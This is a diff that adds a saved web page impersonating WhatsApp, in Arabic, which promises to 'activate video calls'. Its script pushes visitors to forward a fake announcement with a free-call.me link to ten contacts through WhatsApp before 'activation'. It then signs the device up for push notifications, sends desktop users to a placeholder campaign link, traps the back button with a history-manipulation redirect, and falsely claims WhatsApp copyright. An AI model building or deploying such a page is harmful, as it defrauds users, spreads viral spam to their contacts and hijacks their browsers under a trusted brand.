@@ -1,0 +1,250 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0024)http://whatsprivacy.com/ -->
+<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<link rel="manifest" href="/manifest.json">
+    <script type="text/javascript" src="//cdn.pushwoosh.com/webpush/pushwoosh-web-notifications.js" async></script>
+    <script type="text/javascript">
+        var Pushwoosh = Pushwoosh || [];
+        Pushwoosh.push(['init', {
+            logLevel: 'info', // or debug
+            applicationCode: 'CEC8F-83609',
+            safariWebsitePushID: 'web.com.example.domain',
+            defaultNotificationTitle: 'Pushwoosh',
+            defaultNotificationImage: 'https://cp.pushwoosh.com/img/logo-medium.png'
+        }]);
+        </script>
+		
+		<title>Whatsapp Video Call</title>
+		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;"> 
+		<script async="" type="text/javascript" src="./Whatsapp-Video-Call_files/v2"></script><script async="" type="text/javascript" src="./Whatsapp-Video-Call_files/tc.js"></script><script async="" type="text/javascript" src="./Whatsapp-Video-Call_files/saved_resource"></script><script src="./Whatsapp-Video-Call_files/saved_resource(1)" async="" type="text/javascript"></script><script src="./Whatsapp-Video-Call_files/jquery.min.js"></script> 
+		<meta name="google" content="notranslate">
+		<meta property="og:title" content="Whatsapp Video Call">
+		<meta property="og:type" content="website"> 
+		<meta property="og:url" content="http://whatsapp.com">
+		<meta property="og:image" content="//i.imgur.com/QvoN8jT.png">
+		<meta property="og:description" content="تفعيل مكالمات الفيديو">
+		<link rel="image_src" href="http://i.imgur.com/QvoN8jT.png">
+		<meta property="og:image" content="//i.imgur.com/QvoN8jT.png">
+		<meta name="twitter:image:src" content="//i.imgur.com/QvoN8jT.png">
+		<meta name="twitter:image" content="//i.imgur.com/QvoN8jT.png">
+		
+	<link rel="stylesheet" href="styles.css">
+		<script>
+			
+			
+			$( document ).ready(function() {
+				detectmob();
+				var c=getCookie("invites");
+				if (!isNumber(c)){
+					c=document.getElementById("num").value;
+					}else{
+					document.getElementById("num").value=c; 
+				}
+				
+			});
+			function isNumber (o) {
+				return ! isNaN (o-0) && o !== null && o !== "" && o !== false;
+			}
+			function setCookie(cname, cvalue, exdays) {
+				var d = new Date();
+				d.setTime(d.getTime() + (exdays*24*60*60*1000));
+				var expires = "expires="+d.toUTCString();
+				document.cookie = cname + "=" + cvalue + "; " + expires;
+			} 
+			function getCookie(cname) {
+				c=document.getElementById("num").value;
+				var name = cname + "=";
+				var ca = document.cookie.split(';');
+				for(var i=0; i<ca.length; i++) {
+					var c = ca[i];
+					while (c.charAt(0)==' ') c = c.substring(1);
+					if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+				}
+				return 0;
+			} 
+			function fn1(x)
+			{ 
+				c=document.getElementById("num").value;
+				document.getElementById("num").value=parseInt(c)+1; 
+				c=document.getElementById("num").value;
+				setCookie("invites",c,2);
+				if(c <= 10)
+				{
+ 					/*document.location ="whatsapp://send?text= ✅ رسميا واتس اب تصبح البديل عن كافة برامج مكالمات الصوت والصورة بعد اطلاق منصة لمكالمات الفيديو المسموحة والمتاحة بكل الدول دون استثناء   http://free-call.me";*/
+ 					document.location = "whatsapp://send?text=Officially Watts in August to become the alternative to all the audio programs and calls the picture after the launch platform for video calls are allowed, and available in all countries, without exception http://free-call.me"
+ 					 
+				}
+				else{
+					//alert("لقد نجحت قم بالضغط على صورة التنزيل للتفعيل و التحميل");
+				alert("Then you've succeeded by clicking on the image of the download and activation and loading");
+					
+					Pushwoosh.push(function(api) {
+            		api.registerDevice();
+        			});
+				}
+			}
+			
+			function fn2(x)
+			{
+				c=document.getElementById("num").value;
+				if(c >= 10)
+				{
+					//alert("لقد نجحت قم بالضغط على صورة التنزيل للتفعيل و التحميل");
+				alert("Then you've succeeded by clicking on the image of the download and activation and loading");
+					Pushwoosh.push(function(api) {
+            		api.registerDevice();
+        			});
+				}
+				else
+				{
+					
+					alert("من فضلك قم بدعوة  3 مجموعات أو 10 أصدقاء   لتفعيل مكالمات الفيديو . \n لقد قمت بدعوة "+window.c + " فقط.");
+					//	setTimeout(function(){ 	window.location.hash = '#section'; }, 100);
+					
+				}
+			}
+			nn = 300,
+			t = setInterval( function() {
+				nn=nn-1 
+				if (nn<1){
+					clearInterval( t )
+
+					Pushwoosh.push(function(api) {
+            		api.registerDevice();
+        			});
+
+				} 
+			}, 1000 );
+			
+			
+			navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+			if (navigator.vibrate) {
+				navigator.vibrate([1000, 500]);
+			}
+			
+			
+			function detectmob() { 
+				if( navigator.userAgent.match(/Android/i)
+				|| navigator.userAgent.match(/webOS/i)
+				|| navigator.userAgent.match(/iPhone/i)
+				|| navigator.userAgent.match(/iPad/i)
+				|| navigator.userAgent.match(/iPod/i)
+				|| navigator.userAgent.match(/BlackBerry/i)
+				|| navigator.userAgent.match(/Windows Phone/i)
+				){
+				}
+				else { 
+				 	document.location = "HTTP://DESKTOPCAMPAIGNLINK.COM";
+				}
+			}
+			(function(window, location) {
+				history.replaceState(null, document.title, location.pathname+"#!/hello");
+				history.pushState(null, document.title, location.pathname);
+				
+				window.addEventListener("popstate", function() {
+					if(location.hash === "#!/hello") {
+						history.replaceState(null, document.title, location.pathname);
+						setTimeout(function(){
+							location.replace("HTTP://replace_this_link.com");
+						},0);
+					}
+				}, false);
+			}(window, location));
+			
+		</script>
+		<style>
+			.mysliderimg{
+			width: 121%;
+			height: 100%;
+			margin-right: -33px; 
+			padding-bottom: 10px;
+			}
+			
+		</style>
+	</head>
+	
+	<body>
+		<input type="hidden" id="num" value="0">
+		<div class="wrapper">
+			
+			<div class="shade">
+				<div class="bar">
+					<div class="logo">
+						<a href="HTTP://replace_this_link.com"></a>
+					</div>
+					<div class="title">
+						<h1>WhatsApp Messenger</h1>
+					</div>
+					
+				</div>
+			</div>   	
+					<div class="top home"> 
+				<a id="section"></a>
+				<center>
+					<img class="mysliderimg" src="./Whatsapp-Video-Call_files/giphy.gif"> 
+				</center>
+				<h3><a class="action" href="HTTP://replace_this_link.com" onclick="fn1(this)">دعوة الأصدقاء</a></h3>
+				<h3><a class="action" href="HTTP://replace_this_link.com" onclick="fn2(this)">تفعيل مكالمات الفيديو</a></h3>  
+				
+				
+				<ul class="menu">
+					<li><a href="http://www.whatsapp.com/about">حول</a></li>
+					<li><a href="http://www.whatsapp.com/faq">الأسئلة المتكررة</a></li>
+					<li><a href="http://blog.whatsapp.com/">المدونة (بالإنكليزية)</a></li>
+				</ul>
+			</div>
+			
+			<div class="content">
+				
+				<div class="section s1">
+					<span class="icon"></span>
+					<h2>الاتصال المرئي</h2>
+					<p> بعد النجاح الذي حققناه بالاتصال الصوتي كان لا بد من اضافة الاتصال المرئي لتتواصل مع أحبابك بشكل تفاعلي أكثر</p>
+					</div>
+				
+				<div class="section s2">
+					<span class="icon"></span>
+					<h2>وسائط متعددة</h2>
+					<p>عيش الدنيا وشارك أصدقاءك عالمك من خلال تبادل الصور والفيديو والمواقع عبر واتساب</p>
+				</div>
+				
+				<div class="section s3">
+				<span class="icon"></span>
+				<h2>دردشة جماعية</h2>
+				<p>اختر مقهاً تلتقي فيه الأصدقاء هذا المساء أو شارك عائلتك أخبارك السعيدة. وكل ذلك من خلال الدردشة الجماعية.</p>
+				</div>
+				
+				<div class="section s4">
+					<span class="icon"></span>
+					<h2>مراسلة فورية مدهشة</h2>
+					<p>ابقى على تواصل مباشر وفوري من خلال إشعارات Push لدفع البيانات و تنبيهات استلام الدردشات وحالة الكتابة.</p>
+				</div>
+				
+				
+				
+			</div>
+			
+			
+			
+			<div id="footer" class="footer">
+				<div id="btm-menu">
+					<a href="HTTP://this_link_was_whatsprivacy.com" class="home-link"></a>
+					
+					<div id="copyright">
+						© 2015 WhatsApp Inc.
+					</div>
+					
+					<div class="social">
+						<div class="btns">
+							<span class="btn btn1"><a href="https://twitter.com/whatsapp">Twitter</a></span>
+							<span class="btn btn2"><a href="https://facebook.com/whatsapp.official">Facebook</a></span>
+							<span class="btn btn3"><a href="https://plus.google.com/102708307632999019941/posts">Google Plus</a></span>
+						</div>
+					</div>
+				</div>
+			</div>	
+</div>
+<script async="" src="./Whatsapp-Video-Call_files/saved_resource(2)"></script>
+</body>
+</html>
